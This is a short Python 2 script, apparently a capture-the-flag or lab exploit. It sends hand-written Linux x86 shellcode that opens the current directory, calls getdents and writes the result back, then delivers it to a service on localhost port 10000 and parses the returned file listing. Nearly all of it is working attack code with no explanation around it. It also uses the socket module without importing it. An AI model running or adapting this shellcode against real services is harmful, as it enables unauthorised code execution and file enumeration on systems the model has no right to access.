from struct import pack, unpack

def decode_getdents(getdents):
    index = 0
    while True:
        entry_len = unpack('<H', getdents[index+8:index+10])[0]
        getdent = getdents[index:index+entry_len+1]
        inode = unpack('<I', getdent[0:4])[0]
        filename = getdent[10:10+entry_len-2]
        yield inode, filename
        index += entry_len
        if index == len(getdents):
            break

# custom Linux x86 open('.')+getdents()+write()
shellcode = "\xe9\x41\x00\x00\x00\x31\xc0\x31\xff\x47\x47\x47\x47\x01\xf8\x40\x5b\x31\xc9\x31\xd2\xcd\x80\x85\xc0\x74\x24\x89\xc3\xba\x37\x13\x00\x00\x29\xd4\x89\xe1\xb8\x8d\x00\x00\x00\xcd\x80\x89\xc2\x89\xf8\x40\x40\xcd\x80\x89\xe1\x89\xfb\x89\xf8\xcd\x80\x01\xd4\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xba\xff\xff\xff\x2e\x00"

print "shellcode len=", len(shellcode)

host = 'localhost'
port = 10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.send(shellcode)

for (inode, filename) in decode_getdents(s.recv(0x1337)):
    print inode, filename

